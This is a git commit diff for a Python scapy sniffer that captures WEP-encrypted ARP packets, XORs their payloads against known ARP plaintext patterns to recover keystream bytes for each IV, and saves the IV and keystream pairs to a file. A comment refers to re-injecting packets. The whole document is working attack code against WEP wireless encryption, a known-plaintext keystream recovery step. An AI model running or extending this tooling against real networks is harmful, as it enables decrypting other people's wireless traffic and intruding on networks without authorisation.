0116e9f342ba525cd4755dd53384b3ce6a5e0337
Your Name <user@example.com>
2021-03-30 10:49:27 -0400

    Fixed writing to file of keystreams and IVs. Also cleaned up some comments

--- sniffer.py
+++ sniffer.py
@@ -1,5 +1,4 @@
 # NOTE
-# When re-injecting, it is possible the NIC is not sniffing, not sure
 # 50% chance IV repeats after 5000 packets
 
 from scapy.all import *
@@ -24,39 +23,39 @@ def expand(x):
 def arp_monitor_callback(pkt):
     global arp_packets_captured
     global iface
-    if len(pkt) == 112 or len(pkt) == 110:
-        # print(pkt[RadioTap].len)
+    if len(pkt) == 112 or len(pkt) == 110 or len(pkt) == 80 or len(pkt) == 81:
         layers = list(expand(pkt))
         if '802.11 WEP packet' in layers:
-            if arp_packets_captured % 50 == 0:
-                print(arp_packets_captured)
-            src_address = pkt.addr2
-            bssid = pkt.addr1
-            iv_bytes = binascii.hexlify(pkt.iv)
-            iv_hexstring = iv_bytes.decode('UTF-8')
-            data_bytes = binascii.hexlify(pkt.wepdata)
-            data_hexstring = data_bytes.decode('UTF-8')[:32]
-            data_dec = int(data_hexstring, 16)
+            if len(pkt.wepdata) == 36:
+                if arp_packets_captured % 1000 == 0:
+                    print(arp_packets_captured)
+                src_address = pkt.addr2
+                bssid = pkt.addr1
+                iv_bytes = binascii.hexlify(pkt.iv)
+                iv_hexstring = iv_bytes.decode('UTF-8')
+                data_bytes = binascii.hexlify(pkt.wepdata)
+                data_hexstring = data_bytes.decode('UTF-8')[:32]
+                data_dec = int(data_hexstring, 16)
 
-            # ARP request
-            if pkt.addr3 == 'ff:ff:ff:ff:ff:ff':
-                xor = data_dec ^ int(ARP_REQUEST_PATTERN, 16)
-                keystream_first_bytes = hex(xor)[2:]
-                if iv_hexstring not in keystreams:
-                    arp_packets_captured += 1
-                    keystreams[iv_hexstring] = keystream_first_bytes
-            # ARP response
-            else:
-                xor = data_dec ^ int(ARP_RESPONSE_PATTERN, 16)
-                keystream_first_bytes = hex(xor)[2:]
-                if iv_hexstring not in keystreams:
-                    arp_packets_captured += 1
-                    keystreams[iv_hexstring] = keystream_first_bytes
+                # ARP request
+                if pkt.addr3 == 'ff:ff:ff:ff:ff:ff':
+                    xor = data_dec ^ int(ARP_REQUEST_PATTERN, 16)
+                    keystream_first_bytes = hex(xor)[2:]
+                    if iv_hexstring not in keystreams:
+                        arp_packets_captured += 1
+                        keystreams[iv_hexstring] = keystream_first_bytes
+                # ARP response
+                else:
+                    xor = data_dec ^ int(ARP_RESPONSE_PATTERN, 16)
+                    keystream_first_bytes = hex(xor)[2:]
+                    if iv_hexstring not in keystreams:
+                        arp_packets_captured += 1
+                        keystreams[iv_hexstring] = keystream_first_bytes
 
 
 def stop_condition(pkt):
     global arp_packets_captured
-    if arp_packets_captured > 1000: return True
+    if arp_packets_captured > 5000: return True
 
 
 if __name__ == "__main__":
@@ -87,4 +86,4 @@ if __name__ == "__main__":
         print(len(keystreams))
         for key, value in keystreams.items():
             # print(f'{key} - {value}')
-            f.write('{key}:{value}')
+            f.write(f'{key}:{value}\n')
